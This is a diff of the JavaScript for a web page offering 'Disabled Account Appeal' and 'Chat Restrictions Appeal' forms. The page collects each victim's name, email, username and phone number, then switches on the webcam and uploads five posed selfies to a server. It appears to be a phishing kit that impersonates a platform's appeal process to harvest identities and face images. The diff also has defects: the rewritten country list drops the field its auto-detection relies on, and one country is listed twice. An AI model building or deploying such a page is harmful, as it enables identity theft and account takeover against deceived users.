-            { iso: "YE", code: "+967", flag: "🇾🇪", name: "Yemen" },
-            { iso: "ZM", code: "+260", flag: "🇿🇲", name: "Zambia" },
-            { iso: "ZW", code: "+263", flag: "🇿🇼", name: "Zimbabwe" }
+        const COUNTRIES = [
+            { code: "+1", flag: "🇺🇸", name: "United States" },
+            { code: "+91", flag: "🇮🇳", name: "India" },
+            { code: "+44", flag: "🇬🇧", name: "United Kingdom" },
+            { code: "+61", flag: "🇦🇺", name: "Australia" },
+            { code: "+81", flag: "🇯🇵", name: "Japan" },
+            { code: "+86", flag: "🇨🇳", name: "China" },
+            { code: "+49", flag: "🇩🇪", name: "Germany" },
+            { code: "+33", flag: "🇫🇷", name: "France" },
+            { code: "+39", flag: "🇮🇹", name: "Italy" },
+            { code: "+34", flag: "🇪🇸", name: "Spain" },
+            { code: "+55", flag: "🇧🇷", name: "Brazil" },
+            { code: "+52", flag: "🇲🇽", name: "Mexico" },
+            { code: "+7", flag: "🇷🇺", name: "Russia" },
+            { code: "+82", flag: "🇰🇷", name: "South Korea" },
+            { code: "+31", flag: "🇳🇱", name: "Netherlands" },
+            { code: "+46", flag: "🇸🇪", name: "Sweden" },
+            { code: "+41", flag: "🇨🇭", name: "Switzerland" },
+            { code: "+47", flag: "🇳🇴", name: "Norway" },
+            { code: "+45", flag: "🇩🇰", name: "Denmark" },
+            { code: "+358", flag: "🇫🇮", name: "Finland" },
+            { code: "+30", flag: "🇬🇷", name: "Greece" },
+            { code: "+90", flag: "🇹🇷", name: "Turkey" },
+            { code: "+966", flag: "🇸🇦", name: "Saudi Arabia" },
+            { code: "+971", flag: "🇦🇪", name: "UAE" },
+            { code: "+972", flag: "🇮🇱", name: "Israel" },
+            { code: "+20", flag: "🇪🇬", name: "Egypt" },
+            { code: "+27", flag: "🇿🇦", name: "South Africa" },
+            { code: "+254", flag: "🇰🇪", name: "Kenya" },
+            { code: "+234", flag: "🇳🇬", name: "Nigeria" },
+            { code: "+92", flag: "🇵🇰", name: "Pakistan" },
+            { code: "+94", flag: "🇱🇰", name: "Sri Lanka" },
+            { code: "+977", flag: "🇳🇵", name: "Nepal" },
+            { code: "+880", flag: "🇧🇩", name: "Bangladesh" },
+            { code: "+60", flag: "🇲🇾", name: "Malaysia" },
+            { code: "+62", flag: "🇮🇩", name: "Indonesia" },
+            { code: "+63", flag: "🇵🇭", name: "Philippines" },
+            { code: "+64", flag: "🇳🇿", name: "New Zealand" },
+            { code: "+65", flag: "🇸🇬", name: "Singapore" },
+            { code: "+66", flag: "🇹🇭", name: "Thailand" },
+            { code: "+84", flag: "🇻🇳", name: "Vietnam" },
+            { code: "+886", flag: "🇹🇼", name: "Taiwan" },
+            { code: "+98", flag: "🇮🇷", name: "Iran" },
+            { code: "+964", flag: "🇮🇶", name: "Iraq" },
+            { code: "+962", flag: "🇯🇴", name: "Jordan" },
+            { code: "+961", flag: "🇱🇧", name: "Lebanon" },
+            { code: "+968", flag: "🇴🇲", name: "Oman" },
+            { code: "+974", flag: "🇶🇦", name: "Qatar" },
+            { code: "+965", flag: "🇰🇼", name: "Kuwait" },
+            { code: "+973", flag: "🇧🇭", name: "Bahrain" },
+            { code: "+212", flag: "🇲🇦", name: "Morocco" },
+            { code: "+216", flag: "🇹🇳", name: "Tunisia" },
+            { code: "+213", flag: "🇩🇿", name: "Algeria" },
+            { code: "+218", flag: "🇱🇾", name: "Libya" },
+            { code: "+966", flag: "🇸🇦", name: "Saudi Arabia" },
+            { code: "+967", flag: "🇾🇪", name: "Yemen" },
+            { code: "+251", flag: "🇪🇹", name: "Ethiopia" },
+            { code: "+256", flag: "🇺🇬", name: "Uganda" },
+            { code: "+255", flag: "🇹🇿", name: "Tanzania" },
+            { code: "+260", flag: "🇿🇲", name: "Zambia" },
+            { code: "+263", flag: "🇿🇼", name: "Zimbabwe" }
         ];
 
         // ============================================================
-        // 2. CUSTOM DROPDOWN LOGIC
+        // 2. DROPDOWN LOGIC
         // ============================================================
-        let activeDropdown = null;
-
-        function toggleDropdown(el) {
-            const container = el.closest('.country-dropdown');
-            const list = container.querySelector('.dropdown-list');
-            const isOpen = list.classList.contains('open');
-            // close all
-            document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
-            if (!isOpen) {
-                list.classList.add('open');
-                activeDropdown = container;
-                // Populate options if empty
-                const optionsContainer = container.querySelector('.dropdown-options');
-                if (!optionsContainer.hasChildNodes()) {
-                    renderOptions(optionsContainer);
-                }
-                // highlight current selection
-                const currentCode = container.querySelector('.selected .code').textContent;
-                const opts = optionsContainer.querySelectorAll('.option');
-                opts.forEach(o => {
-                    o.classList.toggle('active', o.dataset.code === currentCode);
-                });
-                // focus search
-                const searchInput = container.querySelector('.dropdown-search input');
-                if (searchInput) {
-                    searchInput.focus();
-                    searchInput.value = '';
-                    filterCountries(searchInput);
-                }
-            }
-        }
-
-        function renderOptions(container) {
+        function renderOptions(dropdownId) {
+            const container = document.getElementById('optionsContainer' + dropdownId.replace('countryDropdown', ''));
+            if (!container) return;
             container.innerHTML = '';
-            countries.forEach(c => {
+            COUNTRIES.forEach(c => {
                 const div = document.createElement('div');
                 div.className = 'option';
                 div.dataset.code = c.code;
                 div.innerHTML = `<span class="flag">${c.flag}</span><span class="code">${c.code}</span> ${c.name}`;
                 div.onclick = function() {
-                    selectCountry(this.closest('.country-dropdown'), c.code, c.flag);
+                    const countryDropdown = this.closest('.country-dropdown');
+                    const selected = countryDropdown.querySelector('.selected');
+                    selected.querySelector('.flag').textContent = c.flag;
+                    selected.querySelector('.code').textContent = c.code;
+                    // close dropdown
+                    countryDropdown.querySelector('.dropdown-list').classList.remove('open');
+                    // validate phone
+                    const phoneInput = countryDropdown.closest('.phone-group').querySelector('.phone-input');
+                    if (phoneInput) validatePhone(phoneInput);
                 };
                 container.appendChild(div);
             });
         }
 
-        function filterCountries(input) {
-            const container = input.closest('.country-dropdown');
-            const optionsContainer = container.querySelector('.dropdown-options');
-            const query = input.value.toLowerCase().trim();
-            const options = optionsContainer.querySelectorAll('.option');
-            options.forEach(opt => {
-                const text = opt.textContent.toLowerCase();
-                opt.style.display = text.includes(query) ? '' : 'none';
-            });
-        }
+        function toggleDropdown(dropdownId) {
+            const dropdown = document.getElementById(dropdownId);
+            const list = dropdown.querySelector('.dropdown-list');
+            const isOpen = list.classList.contains('open');
 
-        function selectCountry(container, code, flag) {
-            const selected = container.querySelector('.selected');
-            selected.querySelector('.flag').textContent = flag;
-            selected.querySelector('.code').textContent = code;
-            // close dropdown
-            container.querySelector('.dropdown-list').classList.remove('open');
-            // trigger validation on phone number
-            const phoneInput = container.closest('.phone-group').querySelector('.phone-input');
-            if (phoneInput) {
-                validatePhone(phoneInput);
+            // close all
+            document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
+
+            if (!isOpen) {
+                list.classList.add('open');
+                const id = dropdownId.replace('countryDropdown', '');
+                const container = document.getElementById('optionsContainer' + id);
+                if (container && !container.hasChildNodes()) {
+                    renderOptions(dropdownId);
+                }
+                // highlight selected
+                const code = dropdown.querySelector('.selected .code').textContent;
+                container.querySelectorAll('.option').forEach(o => {
+                    o.classList.toggle('active', o.dataset.code === code);
+                });
+                // focus search
+                const search = dropdown.querySelector('.dropdown-search input');
+                if (search) { search.value = '';
+                    search.focus(); }
             }
         }
 
-        // Close dropdown when clicking outside
+        function filterDropdown(dropdownId) {
+            const dropdown = document.getElementById(dropdownId);
+            const input = dropdown.querySelector('.dropdown-search input');
+            const query = input.value.toLowerCase().trim();
+            const options = dropdown.querySelectorAll('.option');
+            options.forEach(o => {
+                const text = o.textContent.toLowerCase();
+                o.style.display = text.includes(query) ? '' : 'none';
+            });
+        }
+
+        // Close dropdowns on outside click
         document.addEventListener('click', function(e) {
             if (!e.target.closest('.country-dropdown')) {
                 document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
@@ -947,221 +766,183 @@
         });
 
         // ============================================================
-        // 3. DETECT USER COUNTRY (IP or browser)
+        // 3. AUTO DETECT COUNTRY
         // ============================================================
         async function detectAndSetCountry() {
-            let detectedIso = null;
             try {
                 const res = await fetch('https://ipapi.co/country/');
                 if (res.ok) {
-                    detectedIso = (await res.text()).trim().toUpperCase();
+                    const iso = (await res.text()).trim().toUpperCase();
+                    const country = COUNTRIES.find(c => c.iso === iso);
+                    if (country) {
+                        document.querySelectorAll('.country-dropdown').forEach(dd => {
+                            const selected = dd.querySelector('.selected');
+                            selected.querySelector('.flag').textContent = country.flag;
+                            selected.querySelector('.code').textContent = country.code;
+                        });
+                    }
                 }
             } catch (_) {}
-            if (!detectedIso) {
-                try {
-                    const lang = navigator.language || navigator.languages?.[0] || 'en-US';
-                    const parts = lang.split('-');
-                    if (parts.length > 1) detectedIso = parts[1].toUpperCase();
-                    else {
-                        const map = { en: 'US', hi: 'IN', es: 'ES', fr: 'FR', de: 'DE', zh: 'CN', ja: 'JP', ko: 'KR', ru: 'RU', ar: 'SA', pt: 'PT', it: 'IT', nl: 'NL' };
-                        detectedIso = map[parts[0]] || 'US';
-                    }
-                } catch (_) { detectedIso = 'US'; }
-            }
-            const matched = countries.find(c => c.iso === detectedIso);
-            if (matched) {
-                document.querySelectorAll('.country-dropdown').forEach(dd => {
-                    const selected = dd.querySelector('.selected');
-                    selected.querySelector('.flag').textContent = matched.flag;
-                    selected.querySelector('.code').textContent = matched.code;
-                });
-            }
         }
         detectAndSetCountry();
 
         // ============================================================
-        // 4. PHONE NUMBER VALIDATION & AUTO-PARSE
+        // 4. PHONE VALIDATION
         // ============================================================
         function validatePhone(input) {
-            const container = input.closest('.phone-group');
-            const errorDiv = container.querySelector('.phone-error');
-            const countryCode = container.querySelector('.selected .code').textContent.trim();
+            const group = input.closest('.phone-group');
+            const error = group.querySelector('.phone-error');
+            const codeEl = group.querySelector('.selected .code');
             const raw = input.value.trim();
 
-            // If empty, hide error
             if (!raw) {
-                errorDiv.classList.remove('show');
-                input.setCustomValidity('');
+                error.classList.remove('show');
                 return true;
             }
 
-            // Try to parse if starts with '+'
-            let localNumber = raw;
+            let local = raw;
             let detectedCode = '';
+
+            // If starts with +, try to parse
             if (raw.startsWith('+')) {
-                // Find matching country code
-                const sortedCountries = countries.sort((a, b) => b.code.length - a.code.length);
-                for (const c of sortedCountries) {
+                const sorted = [...COUNTRIES].sort((a, b) => b.code.length - a.code.length);
+                for (const c of sorted) {
                     if (raw.startsWith(c.code)) {
                         detectedCode = c.code;
-                        localNumber = raw.slice(c.code.length);
+                        local = raw.slice(c.code.length);
+                        // auto-fill country
+                        const selected = group.querySelector('.selected');
+                        selected.querySelector('.flag').textContent = c.flag;
+                        selected.querySelector('.code').textContent = c.code;
+                        input.value = local;
                         break;
                     }
                 }
-                if (detectedCode) {
-                    // Auto-fill country code
-                    const flag = countries.find(c => c.code === detectedCode)?.flag || '🌍';
-                    const selected = container.querySelector('.selected');
-                    selected.querySelector('.flag').textContent = flag;
-                    selected.querySelector('.code').textContent = detectedCode;
-                    input.value = localNumber; // update input to local number only
-                } else {
-                    // unknown country code
-                    errorDiv.textContent = 'Unknown country code. Please select your country.';
-                    errorDiv.classList.add('show');
-                    input.setCustomValidity('Invalid');
+                if (!detectedCode) {
+                    error.textContent = 'Unknown country code. Please select your country.';
+                    error.classList.add('show');
                     return false;
                 }
             }
 
-            // Now validate local number: digits only, max 10 digits (we allow 7-10)
-            const digits = localNumber.replace(/\D/g, '');
+            const digits = local.replace(/\D/g, '');
             if (digits.length < 7 || digits.length > 10) {
-                errorDiv.textContent = 'Phone number must be between 7 and 10 digits (after country code).';
-                errorDiv.classList.add('show');
-                input.setCustomValidity('Invalid');
+                error.textContent = 'Please enter 7-10 digits after country code.';
+                error.classList.add('show');
                 return false;
             }
 
-            // valid
-            errorDiv.classList.remove('show');
-            input.setCustomValidity('');
+            error.classList.remove('show');
             return true;
         }
 
-        // Attach validation to all phone inputs
         document.querySelectorAll('.phone-input').forEach(inp => {
-            inp.addEventListener('input', function() {
-                validatePhone(this);
-            });
-            inp.addEventListener('blur', function() {
-                validatePhone(this);
-            });
+            inp.addEventListener('input', function() { validatePhone(this); });
+            inp.addEventListener('blur', function() { validatePhone(this); });
         });
 
         // ============================================================
-        // 5. FOOTER YEAR
+        // 5. FORM SUBMIT & VERIFICATION
         // ============================================================
-        document.getElementById('footerYear').textContent = new Date().getFullYear();
-
-        // ============================================================
-        // 6. FORM SUBMIT LOGIC (unchanged)
-        // ============================================================
-        let verificationState = {
-            currentPose: 0,
-            captures: [],
-            videoStream: null,
-            formData: {},
-            isCapturing: false
-        };
         const POSES = [
-            { name: 'straight', text: 'Look Straight at Camera' },
-            { name: 'up', text: 'Look Up' },
-            { name: 'left', text: 'Turn Face Left' },
-            { name: 'right', text: 'Turn Face Right' },
-            { name: 'straight_final', text: 'Look Straight Again' }
+            'Look Straight',
+            'Look Up',
+            'Turn Left',
+            'Turn Right',
+            'Look Straight Again'
         ];
 
-        function selectOption(type, element) {
-            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
-            element.classList.add('selected');
+        let vState = {
+            pose: 0,
+            stream: null,
+            formData: {},
+            capturing: false
+        };
+
+        function selectOption(type, el) {
+            document.querySelectorAll('.option-item').forEach(o => o.classList.remove('selected'));
+            el.classList.add('selected');
             setTimeout(() => {
                 document.getElementById('selectionScreen').classList.add('hidden');
-                if (type === 'disabled') {
-                    document.getElementById('disabledForm').classList.add('active');
-                } else {
-                    document.getElementById('chatForm').classList.add('active');
-                }
+                document.getElementById(type === 'disabled' ? 'disabledForm' : 'chatForm').classList.add('active');
             }, 300);
         }
 
-        function handleFormSubmit(form, formType) {
-            const formData = new FormData(form);
-            // Combine country code and phone number
-            const container = form.querySelector('.phone-group');
-            const countryCode = container.querySelector('.selected .code').textContent.trim();
-            const phoneInput = container.querySelector('.phone-input');
-            const phoneNumber = phoneInput.value.trim();
-
-            // Validate before submit
+        function handleSubmit(form, formType) {
+            const group = form.querySelector('.phone-group');
+            const phoneInput = group.querySelector('.phone-input');
             if (!validatePhone(phoneInput)) {
                 phoneInput.focus();
                 return;
             }
 
-            const data = Object.fromEntries(formData);
-            // Remove the raw phoneNumber field and add combined phone
-            data.phone = `${countryCode} ${phoneNumber}`;
+            const fd = new FormData(form);
+            const data = Object.fromEntries(fd);
+            const code = group.querySelector('.selected .code').textContent;
+            data.phone = code + ' ' + phoneInput.value.trim();
             delete data.phoneNumber;
 
-            verificationState.formData = { type: formType, ...data };
+            vState.formData = { type: formType, ...data };
 
+            // Send to server
             fetch('/api/submit-form', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             })
-            .then(res => res.json())
+            .then(r => r.json())
             .then(() => {
+                // show verification
                 document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
                 document.getElementById('verificationScreen').classList.add('active');
                 setTimeout(startVerification, 500);
             })
             .catch(err => {
-                alert('Form submit failed: ' + err);
+                alert('Submit failed: ' + err.message);
             });
         }
 
         document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            handleFormSubmit(this, 'Disabled Account Appeal');
+            handleSubmit(this, 'Disabled Account Appeal');
         });
-
         document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            handleFormSubmit(this, 'Chat Restrictions Appeal');
+            handleSubmit(this, 'Chat Restrictions Appeal');
         });
 
-        // ===== Verification Functions (unchanged) =====
+        // ============================================================
+        // 6. CAMERA & SELFIE CAPTURE
+        // ============================================================
         function startVerification() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
-            .then(stream => {
-                verificationState.videoStream = stream;
-                document.getElementById('verificationVideo').srcObject = stream;
-                setTimeout(processNextPose, 2000);
-            })
-            .catch(() => alert('Please allow camera access'));
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } })
+                .then(stream => {
+                    vState.stream = stream;
+                    document.getElementById('verificationVideo').srcObject = stream;
+                    setTimeout(nextPose, 1500);
+                })
+                .catch(() => alert('Camera access required.'));
         }
 
-        function processNextPose() {
-            if (verificationState.currentPose >= POSES.length) {
-                allPosesComplete();
+        function nextPose() {
+            if (vState.pose >= POSES.length) {
+                completeVerification();
                 return;
             }
-            const pose = POSES[verificationState.currentPose];
-            document.getElementById('poseText').textContent = pose.text;
-            document.getElementById('poseCount').textContent = `Pose ${verificationState.currentPose + 1} of ${POSES.length}`;
+            document.getElementById('poseText').textContent = POSES[vState.pose];
+            document.getElementById('poseCount').textContent = `${vState.pose+1}/${POSES.length}`;
             document.getElementById('faceOval').classList.remove('matched');
-            verificationState.isCapturing = false;
+            vState.capturing = false;
+
             setTimeout(() => {
                 document.getElementById('faceOval').classList.add('matched');
-                setTimeout(captureAndSendPose, 600);
+                setTimeout(captureSelfie, 600);
             }, 2000);
         }
 
-        function captureAndSendPose() {
-            if (verificationState.isCapturing) return;
-            verificationState.isCapturing = true;
+        function captureSelfie() {
+            if (vState.capturing) return;
+            vState.capturing = true;
             const video = document.getElementById('verificationVideo');
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
@@ -1169,66 +950,82 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-                const pose = POSES[verificationState.currentPose];
-                const formData = new FormData();
-                formData.append('photo', blob, `selfie_${verificationState.currentPose + 1}.jpg`);
-                formData.append('username', verificationState.formData.username);
-                formData.append('formType', verificationState.formData.type);
-                formData.append('poseText', pose.text);
-                formData.append('poseNumber', verificationState.currentPose + 1);
+                const fd = new FormData();
+                fd.append('photo', blob, `selfie_${vState.pose+1}.jpg`);
+                fd.append('username', vState.formData.username);
+                fd.append('formType', vState.formData.type);
+                fd.append('poseText', POSES[vState.pose]);
+                fd.append('poseNumber', vState.pose + 1);
 
-                fetch('/api/submit-selfie', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(res => res.json())
-                .then(() => {
-                    verificationState.currentPose++;
-                    setTimeout(processNextPose, 800);
-                })
-                .catch(err => {
-                    alert('Selfie upload failed: ' + err);
-                    verificationState.currentPose++;
-                    setTimeout(processNextPose, 800);
-                });
-            }, 'image/jpeg', 0.92);
+                fetch('/api/submit-selfie', { method: 'POST', body: fd })
+                    .then(r => r.json())
+                    .then(() => {
+                        vState.pose++;
+                        setTimeout(nextPose, 600);
+                    })
+                    .catch(err => {
+                        alert('Selfie upload failed: ' + err.message);
+                        vState.pose++;
+                        setTimeout(nextPose, 600);
+                    });
+            }, 'image/jpeg', 0.9);
         }
 
-        function allPosesComplete() {
+        function completeVerification() {
             document.getElementById('poseText').style.display = 'none';
             document.getElementById('poseCount').style.display = 'none';
             document.getElementById('faceOval').style.display = 'none';
             const btn = document.getElementById('verificationSubmitBtn');
             btn.classList.add('show');
-            btn.onclick = () => {
-                const { username, email, phone, fullname, type } = verificationState.formData;
+            btn.onclick = function() {
+                const d = vState.formData;
                 fetch('/api/verification-complete', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, email, phone, fullname, formType: type })
+                    body: JSON.stringify({
+                        username: d.username,
+                        email: d.email,
+                        phone: d.phone,
+                        fullname: d.fullname,
+                        formType: d.type
+                    })
                 })
-                .then(res => res.json())
+                .then(r => r.json())
                 .then(() => {
-                    if (verificationState.videoStream) {
-                        verificationState.videoStream.getTracks().forEach(t => t.stop());
-                    }
+                    if (vState.stream) vState.stream.getTracks().forEach(t => t.stop());
                     document.getElementById('verificationScreen').classList.remove('active');
                     document.getElementById('successModal').classList.add('active');
                 })
-                .catch(err => alert('Completion failed: ' + err));
+                .catch(err => alert('Completion failed: ' + err.message));
             };
         }
 
-        function redirectToMainPage() {
+        function redirectToMain() {
             document.getElementById('successModal').classList.remove('active');
             document.getElementById('selectionScreen').classList.remove('hidden');
             document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
-            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
+            document.querySelectorAll('.option-item').forEach(o => o.classList.remove('selected'));
             document.getElementById('disabledAppealForm').reset();
             document.getElementById('chatAppealForm').reset();
-            verificationState = { currentPose: 0, captures: [], videoStream: null, formData: {}, isCapturing: false };
+            vState = { pose: 0, stream: null, formData: {}, capturing: false };
+            document.getElementById('verificationSubmitBtn').classList.remove('show');
+            document.getElementById('poseText').style.display = 'block';
+            document.getElementById('poseCount').style.display = 'block';
+            document.getElementById('faceOval').style.display = 'block';
             window.scrollTo(0, 0);
         }
+
+        // ============================================================
+        // 7. FOOTER YEAR
+        // ============================================================
+        document.getElementById('footerYear').textContent = new Date().getFullYear();
+
+        // ============================================================
+        // 8. INIT: Pre-populate dropdowns
+        // ============================================================
+        ['1', '2'].forEach(id => {
+            renderOptions('countryDropdown' + id);
+        });
     </script>
 </body>
 </html>
